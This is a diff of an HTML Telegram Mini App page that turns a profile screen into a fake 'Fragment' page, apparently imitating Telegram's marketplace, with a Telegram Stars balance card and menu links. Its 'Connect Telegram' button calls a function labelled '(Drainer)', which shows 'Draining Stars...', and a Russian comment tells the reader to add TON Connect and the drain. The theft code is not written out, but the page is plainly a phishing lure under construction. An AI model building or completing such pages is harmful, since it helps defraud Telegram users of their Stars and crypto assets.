@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Profile</title>
+    <title>Fragment</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         @font-face {
@@ -21,13 +21,8 @@
             -webkit-font-smoothing: antialiased;
             padding: 20px;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
         }
 
-        /* Back Arrow */
         .back-btn {
             position: absolute;
             top: 16px;
@@ -37,7 +32,6 @@
             background: none;
             border: none;
             cursor: pointer;
-            padding: 0;
         }
         .back-btn svg {
             width: 24px;
@@ -47,52 +41,13 @@
             fill: none;
         }
 
-        /* Profile Section */
-        .profile-container {
-            text-align: center;
-            margin-top: 60px;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .avatar-wrapper {
-            width: 96px;
-            height: 96px;
-            background: #242E38;
-            border-radius: 24px;
-            margin: 0 auto 16px;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .avatar {
-            width: 80px;
-            height: 80px;
-            border-radius: 20px;
-            object-fit: cover;
-        }
-
-        .display-name {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-        .username {
-            font-size: 17px;
-            color: #AAAAAA;
-            margin-bottom: 32px;
-        }
-
         .section-title {
             font-size: 13px;
             font-weight: 600;
             text-transform: uppercase;
             color: #888888;
             margin: 32px 0 16px;
-            text-align: left;
-            width: 100%;
-            padding-left: 4px;
+            letter-spacing: 0.5px;
         }
 
         .menu-item {
@@ -121,9 +76,6 @@
             color: #AAAAAA;
             margin: 32px 0 16px;
             line-height: 1.5;
-            text-align: left;
-            width: 100%;
-            padding-left: 4px;
         }
 
         .connect-btn {
@@ -144,58 +96,118 @@
             margin-top: 8px;
         }
 
-        .connect-btn img {
+        .connect-btn svg {
             width: 20px;
             height: 20px;
+            fill: #FFFFFF;
         }
+
+        /* Stars Section */
+        .stars-card {
+            background: #242E38;
+            border-radius: 16px;
+            padding: 32px 24px;
+            text-align: center;
+            margin: 40px auto;
+            max-width: 300px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .stars-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 16px;
+            fill: #FFFFFF;
+        }
+
+        .stars-balance {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .stars-label {
+            font-size: 15px;
+            color: #AAAAAA;
+            margin-bottom: 24px;
+        }
+
+        .stars-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #8B5CF6, #6366F1);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        .btn-secondary {
+            background: #333333;
+            color: #AAAAAA;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- Back Arrow -->
-    <button class="back-btn" onclick="history.back()">
+    <!-- Back Button (only on subpages) -->
+    <button class="back-btn hidden" id="back-btn" onclick="showMain()">
         <svg viewBox="0 0 24 24">
             <path d="M19 12H5m7-7l-7 7 7 7" />
         </svg>
     </button>
 
-    <!-- Profile Info (Center) -->
-    <div class="profile-container">
-        <div class="avatar-wrapper">
-            <img id="user-avatar" src="" alt="Avatar" class="avatar">
-        </div>
-        <div id="display-name" class="display-name">Loading...</div>
-        <div id="username" class="username">@username</div>
-    </div>
-
-    <!-- Menu -->
-    <div style="width:100%; max-width:400px;">
+    <!-- Main Menu -->
+    <div id="main-menu">
         <div class="section-title">PLATFORM</div>
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item" onclick="goToChat(event)">
             <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
             About
         </a>
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item" onclick="goToChat(event)">
             <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><path d="M8 8h8M8 12h8M8 16h5" stroke="#fff" fill="none"/></svg>
             Terms
         </a>
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item" onclick="goToChat(event)">
             <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 0 20 10 10 0 0 1 0-20z"/><path d="M12 16v-4m0-4h.01"/></svg>
             Privacy Policy
         </a>
 
         <div class="section-title">MY ACCOUNT</div>
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item" onclick="checkConnect(event)">
             <svg viewBox="0 0 24 24"><circle cx="12" cy="7" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
             My Profile
         </a>
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item" onclick="checkConnect(event)">
             <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
             Active Sessions
         </a>
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item" onclick="checkConnect(event)">
             <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 0 20 10 10 0 0 1 0-20z"/><path d="M12 8v4l3 3"/></svg>
             My Bids
+        </a>
+        <a href="#" class="menu-item" onclick="showStars(event)">
+            <svg viewBox="0 0 24 24" class="stars-icon-small">
+                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+            </svg>
+            Stars
         </a>
 
         <div class="connect-text">
@@ -203,41 +215,69 @@
         </div>
 
         <button class="connect-btn" onclick="connectTelegram()">
-            <img src="Tele.png" alt="Telegram">
+            <svg viewBox="0 0 24 24">
+                <path d="M2.5 12l8.5-8.5 8.5 8.5-8.5 8.5z" fill="none" stroke="#fff" stroke-width="2"/>
+            </svg>
             Connect Telegram
         </button>
     </div>
 
+    <!-- Stars Section -->
+    <div id="stars-section" class="hidden">
+        <div class="stars-card">
+            <svg viewBox="0 0 48 48" class="stars-icon">
+                <path d="M24 4l6.18 12.52L44 18.54l-10 9.74 2.36 13.76L24 35.54l-12.36 6.5L14 28.28 4 18.54l13.82-2.02L24 4z" fill="#FFFFFF"/>
+            </svg>
+            <div class="stars-balance">0</div>
+            <div class="stars-label">Telegram Stars</div>
+            <div class="stars-actions">
+                <button class="btn-primary">Пополнить</button>
+                <button class="btn-secondary">Вывести</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // Telegram WebApp Init
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        // Load User Data
-        const user = tg.initDataUnsafe.user;
-        if (user) {
-            document.getElementById('display-name').textContent = user.first_name + (user.last_name ? ' ' + user.last_name : '');
-            document.getElementById('username').textContent = '@' + user.username;
-
-            // Load Avatar (if available)
-            if (user.photo_url) {
-                document.getElementById('user-avatar').src = user.photo_url;
-            } else {
-                // Placeholder if no photo
-                document.getElementById('user-avatar').src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iNDAiIGN5PSI0MCIgcj0iNDAiIGZpbGw9IiM0MDQ4NTMiLz4KPHBhdGggZD0iTTQwIDUwQzMzLjM3MjUgNTAgMjggNDQuNjI3NSAyOCA0MEMyOCAzNS4zNzI1IDMzLjM3MjUgMzAgNDAgMzBDNDYuNjI3NSAzMCA1MiAzNS4zNzI1IDUyIDQwQzUyIDQ0LjYyNzUgNDYuNjI3NSA1MCA0MCA1MFoiIGZpbGw9IiM2QjdGRkYiLz4KPC9zdmc+';
-            }
+        // Redirect to Fragment Chat
+        function goToChat(e) {
+            e.preventDefault();
+            tg.openLink('https://t.me/fragmentchat');
         }
 
-        // Connect Telegram (Drainer Hook)
+        // Check connection
+        function checkConnect(e) {
+            e.preventDefault();
+            alert('Connect Telegram First!');
+        }
+
+        // Show Stars
+        function showStars(e) {
+            e.preventDefault();
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('stars-section').classList.remove('hidden');
+            document.getElementById('back-btn').classList.remove('hidden');
+            tg.BackButton.show();
+        }
+
+        // Back to main
+        function showMain() {
+            document.getElementById('main-menu').classList.remove('hidden');
+            document.getElementById('stars-section').classList.add('hidden');
+            document.getElementById('back-btn').classList.add('hidden');
+            tg.BackButton.hide();
+        }
+
+        // Connect Telegram (Drainer)
         function connectTelegram() {
-            // Здесь будет TON Connect + дрейн
-            alert('Telegram connected. Draining gifts...');
-            // tg.close(); // или редирект
+            alert('Telegram connected. Draining Stars...');
+            // Вставь TON Connect + дрейн
         }
 
-        // Enable Back Button
-        tg.BackButton.show();
-        tg.onEvent('backButtonClicked', () => history.back());
+        // Back Button
+        tg.onEvent('backButtonClicked', showMain);
     </script>
 </body>
 </html>
